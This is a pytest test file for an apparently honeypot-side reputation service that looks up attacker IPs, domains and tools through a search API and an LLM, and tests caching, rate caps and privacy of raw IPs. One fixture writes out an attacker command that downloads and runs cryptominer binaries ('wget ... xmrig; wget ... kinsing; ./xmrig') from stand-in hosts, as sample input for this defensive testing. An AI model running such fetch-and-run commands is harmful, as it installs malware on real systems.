import json
from datetime import datetime, timedelta, timezone

import fakeredis
import pytest

from brain.budget import hour_key
from brain.reputation import ReputationService, Target
from brain.session import Session
from brain.worker import EVENTS, Brain

from fakes import SETTINGS, FakeGeo, FakeLLM, FakeSerp, MemoryRepCache, event_validator, load_fixture

VALIDATOR = event_validator()
MALICIOUS = {"reputation": "malicious", "family": "mirai", "summary": "Reported for ssh brute force by 203.0.113.10.",
             "sources": [{"title": "GreyNoise", "url": "https://viz.greynoise.io/ip/x"},
                         {"title": "made up", "url": "https://not-in-results.example/"}]}


def service(r=None, serp=None, llm=None, db=None, settings=SETTINGS):
    return ReputationService(r or fakeredis.FakeAsyncRedis(), serp or FakeSerp(), llm, db, settings)


async def run_session(name, rep, upto=None):
    r = rep.r
    brain = Brain(r, SETTINGS, FakeGeo(), reputation=rep)
    out = []
    for raw in load_fixture(name)[:upto]:
        out += await brain.handle(raw)
    await brain.wait_idle()
    events = [json.loads(f[b"data"]) for _id, f in await r.xrange(EVENTS)]
    return brain, out, events


# ---- gating ----

def test_gating_requires_login_tripwire_or_download():
    rep = service()
    s = Session("x", source="wild", src_ip="1.2.3.4", ip_hash="a" * 64)
    s.add_login(0, "root", False)
    assert not rep.eligible(s)
    s.add_login(1, "root", True)
    assert rep.eligible(s)
    s2 = Session("y", source="wild", tripwires=[{"id": "t"}])
    assert rep.eligible(s2)
    assert not rep.eligible(Session("z", source="guest", logins=[{"ts": 0, "username": "g", "success": True}]))


async def test_failed_login_scan_never_searches():
    serp = FakeSerp()
    rep = service(serp=serp)
    await run_session("bot", rep, upto=5)  # start + 4 failed logins
    assert serp.queries == []


def test_targets_dedupe_and_cap():
    rep = service()
    s = Session("x", source="wild", src_ip="1.2.3.4", ip_hash="a" * 64)
    s.add_login(0, "root", True)
    raw = {"type": "command", "detail": {"input": "wget http://a.example.org/xmrig; wget http://b.example.org/kinsing; ./xmrig"}}
    first = rep.targets(s, raw)
    kinds = [t.kind for t in first]
    assert kinds[0] == "ip" and len(first) == 4
    assert rep.targets(s, raw) == []  # all marked done, cap reached


def test_boring_domains_and_unrun_tools_skipped():
    rep = service()
    s = Session("x", source="wild", src_ip="1.2.3.4", ip_hash="a" * 64, lookups_done=["ip:" + "a" * 64])
    s.add_login(0, "root", True)
    raw = {"type": "command", "detail": {"input": "curl https://raw.githubusercontent.com/x/y; /usr/local/bin/backup.sh --help"}}
    assert rep.targets(s, raw) == []


def test_ip_cache_key_is_hashed():
    rep = service()
    s = Session("x", source="wild", src_ip="1.2.3.4", ip_hash="b" * 64)
    s.add_login(0, "root", True)
    t = rep.targets(s, {"type": "login_success", "detail": {}})[0]
    assert "1.2.3.4" not in t.key and t.key == "ip:" + "b" * 64


# ---- lookups and caches ----

async def test_lookup_caches_in_redis_and_tiger():
    serp, db = FakeSerp(), MemoryRepCache()
    rep = service(serp=serp, llm=FakeLLM(MALICIOUS), db=db)
    t = Target("domain", '"evil.example"', "domain:abc", "evil.example")
    v1 = await rep.lookup(t)
    v2 = await rep.lookup(t)
    assert v1 == v2 and v1["reputation"] == "malicious"
    assert len(serp.queries) == 1
    assert "domain:abc" in db.rows
    assert await rep.r.ttl("brain:rep:domain:abc") > 6 * 86400


async def test_tiger_hit_skips_search_and_backfills_redis():
    serp, db = FakeSerp(), MemoryRepCache()
    db.rows["tool:x"] = ({"reputation": "malicious", "family": "xmrig", "summary": "miner", "sources": []},
                         datetime.now(timezone.utc) - timedelta(days=6))
    rep = service(serp=serp, db=db)
    v = await rep.lookup(Target("tool", '"x"', "tool:x", "x"))
    assert v["family"] == "xmrig" and serp.queries == []
    ttl = await rep.r.ttl("brain:rep:tool:x")
    assert 0 < ttl <= 86400


async def test_tiger_rows_expire_after_7_days():
    serp, db = FakeSerp(), MemoryRepCache()
    db.rows["tool:x"] = ({"reputation": "malicious", "family": None, "summary": "old", "sources": []},
                         datetime.now(timezone.utc) - timedelta(days=8))
    rep = service(serp=serp, db=db)
    await rep.lookup(Target("tool", '"x"', "tool:x", "x"))
    assert len(serp.queries) == 1


async def test_hourly_cap_blocks_searches():
    serp = FakeSerp()
    rep = service(serp=serp)
    await rep.r.set(hour_key("serpapi"), SETTINGS.serpapi_hourly_cap)
    assert await rep.lookup(Target("domain", '"a"', "domain:a", "a")) is None
    assert serp.queries == []
    assert await rep.r.get("brain:rep:domain:a") is None  # misses aren't cached


async def test_llm_verdict_parsed_and_sources_filtered():
    rep = service(llm=FakeLLM(MALICIOUS))
    v = await rep.lookup(Target("ip", '"203.0.113.10"', "ip:h", "the attacking ip"), src_ip="203.0.113.10")
    assert v["reputation"] == "malicious" and v["family"] == "mirai"
    assert [s["url"] for s in v["sources"]] == ["https://viz.greynoise.io/ip/x"]
    assert "203.0.113.10" not in v["summary"]


async def test_llm_never_sees_the_raw_ip():
    llm = FakeLLM(MALICIOUS)
    serp = FakeSerp([{"title": "203.0.113.10 report", "link": "https://abuse.example/check/203.0.113.10",
                      "snippet": "203.0.113.10 seen brute forcing"},
                     {"title": "blog", "link": "https://blog.example/post", "snippet": "203.0.113.10 is mirai"}])
    rep = service(serp=serp, llm=llm)
    v = await rep.lookup(Target("ip", '"203.0.113.10"', "ip:h", "the attacking ip"), src_ip="203.0.113.10")
    assert "203.0.113.10" not in llm.calls[0][1]
    assert all("203.0.113.10" not in s["url"] for s in v["sources"])


@pytest.mark.parametrize("reply", ["not json", "[]", json.dumps({"reputation": "evil", "family": 3, "summary": ""})])
async def test_malformed_llm_reply_defaults_to_unknown(reply):
    rep = service(llm=FakeLLM(reply))
    v = await rep.lookup(Target("domain", '"a"', "domain:a", "a"))
    assert v["reputation"] == "unknown" and v["family"] is None
    assert v["summary"] and isinstance(v["sources"], list)


async def test_no_llm_gives_plain_dossier():
    rep = service(llm=None)
    v = await rep.lookup(Target("domain", '"a"', "domain:a", "a"))
    assert v["reputation"] == "unknown" and len(v["sources"]) == 2


async def test_llm_cap_falls_back():
    from brain.llm import CapReached
    rep = service(llm=FakeLLM(fail=CapReached()))
    v = await rep.lookup(Target("domain", '"a"', "domain:a", "a"))
    assert v["reputation"] == "unknown"


async def test_only_serpapi_is_contacted():
    """the service has no http client of its own; urls in commands are never fetched."""
    serp = FakeSerp()
    rep = service(serp=serp, llm=FakeLLM(MALICIOUS))
    await run_session("bot", rep)
    assert serp.queries
    assert all(q.startswith('"') for q in serp.queries)


# ---- end to end through the worker ----

async def test_dossier_events_update_reputation_and_threat():
    rep = service(llm=FakeLLM(MALICIOUS), db=MemoryRepCache())
    brain, _out, events = await run_session("human", rep)
    dossiers = [e for e in events if e["type"] == "dossier"]
    assert len(dossiers) == 1  # just the ip; the human downloaded nothing
    for ev in dossiers:
        VALIDATOR.validate(ev)
        assert ev["attacker"]["reputation"] == "malicious"
        assert ev["attacker"]["family"] == "mirai"
    s = await brain.store.get("ssh-hum00001")
    # human only reached med on behavior; malicious bumps it to high
    assert s.threat == "high"
    assert s.reputation == "malicious"


async def test_bot_session_looks_up_ip_domain_and_tool():
    serp = FakeSerp()
    rep = service(serp=serp, llm=FakeLLM(MALICIOUS))
    _brain, _out, events = await run_session("bot", rep)
    assert any("malware.example.net" in q for q in serp.queries)
    assert any("bins.sh" in q for q in serp.queries)
    assert len([e for e in events if e["type"] == "dossier"]) == len(serp.queries) <= 4


async def test_harmless_does_not_override_malicious():
    verdicts = iter([MALICIOUS, {"reputation": "harmless", "family": "censys", "summary": "scanner", "sources": []}])
    rep = service(llm=FakeLLM(lambda *_: json.dumps(next(verdicts))))
    brain, _out, _events = await run_session("bot", rep)
    s = await brain.store.get("ssh-bot00001")
    assert s.reputation == "malicious"
